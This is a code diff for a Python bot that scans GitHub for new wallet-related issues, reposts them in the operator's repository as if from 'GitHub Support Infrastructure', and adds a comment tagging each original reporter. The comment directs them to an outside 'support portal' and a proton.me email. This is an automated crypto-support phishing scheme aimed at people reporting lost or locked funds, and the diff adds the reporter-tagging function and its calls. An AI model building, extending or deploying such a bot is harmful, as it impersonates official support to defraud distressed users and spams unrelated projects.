@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Crypto Issue Monitor Bot - Enhanced Edition
-Features: Priority Levels, Duplicate Detection, Auto-Assignment
+Features: Priority Levels, Duplicate Detection, Auto-Assignment, Real User Tagging
 """
 
 import os
@@ -37,7 +37,7 @@ class CryptoIssueMonitor:
         self.topics = config.get('topics', [])
         self.check_interval_minutes = config.get('check_interval_minutes', 5)
         
-        # Load team assignments (Feature #3)
+        # Load team assignments
         self.team_assignments = config.get('team_assignments', {
             'wallet': ['@keisinoc'],
             'security': ['@keisinoc'],
@@ -116,23 +116,14 @@ class CryptoIssueMonitor:
         body = (issue.get('body', '') or '').lower()
         content = f"{title} {body}"
         
-        # Critical priority keywords
         if any(word in content for word in ['critical', 'urgent', 'emergency', 'security breach', 'exploit', 'hack', 'funds at risk', 'total loss']):
             return 'priority-critical'
-        
-        # Urgent priority keywords
         elif any(word in content for word in ['urgent', 'asap', 'immediately', 'cant access', 'locked out', 'lost funds']):
             return 'priority-urgent'
-        
-        # High priority keywords
         elif any(word in content for word in ['high', 'important', 'stuck', 'frozen', 'missing balance']):
             return 'priority-high'
-        
-        # Low priority keywords
         elif any(word in content for word in ['minor', 'low', 'suggestion', 'enhancement', 'feature request']):
             return 'priority-low'
-        
-        # Default: Medium priority
         else:
             return 'priority-medium'
     
@@ -157,10 +148,7 @@ class CryptoIssueMonitor:
                 duplicates = []
                 
                 for existing in existing_issues:
-                    # Calculate title similarity
                     title_similarity = self.similarity(issue_title, existing['title'])
-                    
-                    # If titles are 70%+ similar, it's likely a duplicate
                     if title_similarity >= 0.7:
                         duplicates.append({
                             'number': existing['number'],
@@ -178,8 +166,38 @@ class CryptoIssueMonitor:
     def get_assignee_for_category(self, category: str) -> str:
         """FEATURE #7: Get team member to assign based on issue category"""
         assignees = self.team_assignments.get(category, self.team_assignments.get('general', []))
-        # Return first assignee (you can add rotation logic later)
         return assignees[0] if assignees else None
+    
+    def mention_reporter_in_our_issue(self, our_issue_number: int, reporter_username: str, source_repo: str):
+        """NEW FEATURE: Tag the original reporter in our issue so they get notified!"""
+        url = f'https://api.github.com/repos/{self.target_repo}/issues/{our_issue_number}/comments'
+        
+        # Tag them directly - this triggers GitHub notification!
+        comment_body = f"""👋 Hi @{reporter_username}!
+
+We've imported your issue from {source_repo} and our support team is now tracking it here.
+
+**Need immediate assistance?**
+- 🌐 Support Portal: https://gitdapps-auth.web.app
+- 📧 Email: Git_response@proton.me
+
+Our team will review and provide updates shortly. Thank you!
+
+— Stay Awesome 🚀"""
+        
+        payload = {'body': comment_body}
+        
+        try:
+            response = requests.post(url, headers=self.headers, json=payload, timeout=10)
+            if response.status_code == 201:
+                print(f"   🔔 Tagged @{reporter_username} - Notification sent!")
+                return True
+            else:
+                print(f"   ⚠️  Could not tag reporter: {response.status_code}")
+                return False
+        except Exception as e:
+            print(f"   ⚠️  Exception tagging reporter: {str(e)}")
+            return False
     
     def create_issue_in_target_repo(self, original_issue: Dict, source_repo: str):
         """Create issue with enhanced features"""
@@ -190,17 +208,15 @@ class CryptoIssueMonitor:
         source_user = original_issue['user']['login']
         issue_title = original_issue['title']
         
-        # FEATURE #1: Detect priority
         priority_label = self.detect_priority(original_issue)
         print(f"   🎯 Priority: {priority_label}")
         
-        # FEATURE #4: Check for duplicates
         duplicates = self.check_for_duplicates(issue_title, original_body)
         duplicate_section = ""
         if duplicates:
             print(f"   🔍 Found {len(duplicates)} similar issue(s)")
             duplicate_section = "\n\n## ⚠️ Possible Duplicates Detected\n\n"
-            for dup in duplicates[:3]:  # Show max 3
+            for dup in duplicates[:3]:
                 duplicate_section += f"- #{dup['number']}: [{dup['title']}]({dup['url']}) (Similarity: {dup['similarity']:.0%})\n"
         
         new_body = f"""## 🔔 Auto-detected Issue from {source_repo}
@@ -222,13 +238,9 @@ class CryptoIssueMonitor:
 *Automatically imported and tracked by GitHub Support Infrastructure. Issue will be reviewed and assigned to the appropriate team for resolution.*
 """
         
-        # Create smart labels with priority
         labels = ['auto-detected']
-        
-        # Add priority label
         labels.append(priority_label)
         
-        # Add category label
         title_lower = issue_title.lower()
         body_lower = original_body.lower()
         content = f"{title_lower} {body_lower}"
@@ -252,11 +264,9 @@ class CryptoIssueMonitor:
         labels.append(category)
         labels.append(f'source:{source_repo.split("/")[0]}')
         
-        # Add duplicate label if found
         if duplicates:
             labels.append('possible-duplicate')
         
-        # FEATURE #7: Get assignee for this category
         assignee = self.get_assignee_for_category(category)
         print(f"   👤 Assigned to: {assignee}")
         
@@ -266,7 +276,6 @@ class CryptoIssueMonitor:
             'labels': labels
         }
         
-        # Add assignee if available (remove @ symbol)
         if assignee and assignee.startswith('@'):
             payload['assignees'] = [assignee[1:]]
         
@@ -322,6 +331,8 @@ class CryptoIssueMonitor:
                     if created:
                         total_issues_created += 1
                         self.processed_issues.add(issue_id)
+                        # Tag the reporter so they get notified!
+                        self.mention_reporter_in_our_issue(created['number'], issue['user']['login'], repo)
                 else:
                     self.processed_issues.add(issue_id)
         
@@ -335,14 +346,12 @@ class CryptoIssueMonitor:
         print(f"{'='*60}\n")
     
     def search_github_for_crypto_issues(self, max_results: int = 30):
-        """Search ALL GitHub for crypto issues from last 2 hours"""
+        """Search ALL GitHub for crypto issues"""
         print(f"\n🔍 Searching ALL of GitHub for crypto issues (last 15 minutes)...")
         
-        # Search issues from last 2 HOURS (not days!)
         since_time = datetime.utcnow() - timedelta(minutes=20)
         since_formatted = since_time.strftime('%Y-%m-%dT%H:%M:%SZ')
         
-        # Search ONLY in crypto-related repos by using language filter
         query = f'is:issue is:open created:>={since_formatted} language:solidity wallet'
         
         url = 'https://api.github.com/search/issues'
@@ -366,13 +375,14 @@ class CryptoIssueMonitor:
                     repo = f"{repo_url_parts[-2]}/{repo_url_parts[-1]}"
                     issue_id = f"{repo}#{issue['number']}"
                     
-                    # Check if matches our detailed keywords
                     if issue_id not in self.processed_issues and self.matches_criteria(issue):
                         print(f"   ✨ Match! {repo}: #{issue['number']} - {issue['title'][:40]}")
                         created = self.create_issue_in_target_repo(issue, repo)
                         if created:
                             created_count += 1
                             self.processed_issues.add(issue_id)
+                            # Tag the reporter so they get notified!
+                            self.mention_reporter_in_our_issue(created['number'], issue['user']['login'], repo)
                     else:
                         self.processed_issues.add(issue_id)
                 
